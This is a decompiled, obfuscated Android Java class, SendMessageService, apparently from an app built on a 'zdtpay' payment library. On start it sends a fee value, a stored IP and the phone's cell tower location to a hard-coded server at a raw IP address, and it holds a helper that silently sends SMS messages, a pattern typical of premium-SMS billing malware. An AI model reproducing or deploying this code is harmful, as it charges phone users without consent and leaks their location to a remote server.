package com.forone;

import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.telephony.SmsManager;
import com.forone.a.b;
import com.zdtpay.tools.c;
import java.io.PrintStream;
import java.util.TreeMap;

public class SendMessageService
  extends Service
{
  String a = "SENT_SMS_ACTION";
  String b = "DELIVERED_SMS_ACTION";
  private boolean c;
  private BroadcastReceiver d = new e(this);
  private BroadcastReceiver e = new f(this);
  
  public SendMessageService() {}
  
  private void a(String paramString1, String paramString2, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2)
  {
    if ((paramString1 != null) && (!paramString1.equals("")) && (paramString2 != null) && (!paramString2.equals(""))) {
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, paramPendingIntent1, paramPendingIntent2);
    }
  }
  
  public void a()
  {
    TreeMap localTreeMap = new TreeMap();
    localTreeMap.put("channelid", "216");
    localTreeMap.put("type", "6");
    localTreeMap.put("fee", "1");
    localTreeMap.put("cpparam", "");
    localTreeMap.put("ip", getSharedPreferences("mysp", 0).getString(c.a, ""));
    localTreeMap.put("bsc_lac", com.zdtpay.tools.f.b(this));
    localTreeMap.put("bsc_cid", com.zdtpay.tools.f.c(this));
    b().a(new Object[] { Integer.valueOf(RequestTask.a), "http://112.74.111.56:9039/gamesit/puburl", localTreeMap, new g(this), Integer.valueOf(0) });
  }
  
  public RequestTask b()
  {
    return new RequestTask(this);
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (!this.c) {
      try
      {
        this.c = true;
        paramIntent = getSharedPreferences("mysp", 0).getString(c.i, "");
        if (com.zdtpay.tools.f.d(this)) {
          if (b.a(paramIntent)) {
            a();
          } else {
            System.out.println("-- - --被屏蔽 - -forZY -" + paramIntent);
          }
        }
      }
      catch (Exception paramIntent)
      {
        paramIntent.printStackTrace();
      }
    }
    return 2;
  }
  
  public void unbindService(ServiceConnection paramServiceConnection)
  {
    super.unbindService(paramServiceConnection);
  }
}
